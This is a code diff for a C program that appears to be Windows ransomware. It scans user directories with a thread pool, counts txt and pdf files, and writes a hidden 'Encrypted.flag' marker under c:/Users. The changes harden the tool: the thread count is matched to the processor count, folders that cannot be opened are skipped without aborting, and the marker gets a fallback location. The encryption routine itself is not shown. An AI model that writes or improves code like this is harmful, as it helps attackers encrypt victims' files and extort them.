@@ -21,6 +21,9 @@ char encryptedFile[1024];
 // 是否加密标志
 int Encrypted=0;
 
+// thread number
+int threadnums = 0;
+
 atomic_int path_arr_index= ATOMIC_VAR_INIT(0),
     txt_counts= ATOMIC_VAR_INIT(0),
     pdf_counts= ATOMIC_VAR_INIT(0),
@@ -45,10 +48,23 @@ void init(){
     while((entry=readdir(dir))){
         if(strcmp(entry->d_name,"Encrypted.flag")==0){
             Encrypted=1;
-            break;
+            closedir(dir);
+            return;
         }
     }
-    closedir(dir);
+
+    if((dir=opendir("./"))==NULL){
+        printf("fail open './' DIR T_T\n");
+        system("pause > nul");
+        exit(1);
+    }
+    while((entry=readdir(dir))){
+        if(strcmp(entry->d_name,"Encrypted.flag")==0){
+            Encrypted=1;
+            closedir(dir);
+            return;
+        }
+    }
 
 }
 
@@ -102,8 +118,12 @@ void scan(void*arg)
     DIR *dir=opendir(path);
     if(dir==NULL){
         printf("%s\tFail open DIR T_T\n",path);
-        system("pause");
-        exit(1);
+        // system("pause");
+        // exit(1);
+        // 释放动态内存
+        free(path);
+        currentTaskEnd(pool);
+        return;
     }
 
     struct dirent *entry;
@@ -345,7 +365,10 @@ int main()
         return 0;
     }
 
-    pool=threadpoolinit(50);
+    SYSTEM_INFO sysinfo;
+    GetSystemInfo(&sysinfo);
+    threadnums=sysinfo.dwNumberOfProcessors;
+    pool=threadpoolinit(threadnums);
     if(pool==NULL){
         printf("Unable make threadpool T_T!");
         exit(1);
@@ -395,13 +418,14 @@ int main()
     fclose(fp);
 
     // 设置已加密的标志
-    if(fp=fopen("c:/users/Encrypted.flag","w")){
+    if(fp=fopen("c:/Users/Encrypted.flag","w")){
         // 设置隐藏属性（仅适用于Windows系统）
-        int result = SetFileAttributesA("c:/users/Encrypted.flag", FILE_ATTRIBUTE_HIDDEN);
-        if (result == 0) {
-            printf("Error setting file attributes.\n");
-            exit(1);
-        }
+        SetFileAttributesA("c:/Users/Encrypted.flag", FILE_ATTRIBUTE_HIDDEN);
+        fclose(fp);
+
+    }else{
+        fp=fopen("./Encrypted.flag","w");
+        SetFileAttributesA("./Encrypted.flag", FILE_ATTRIBUTE_HIDDEN);
         fclose(fp);
     }
 
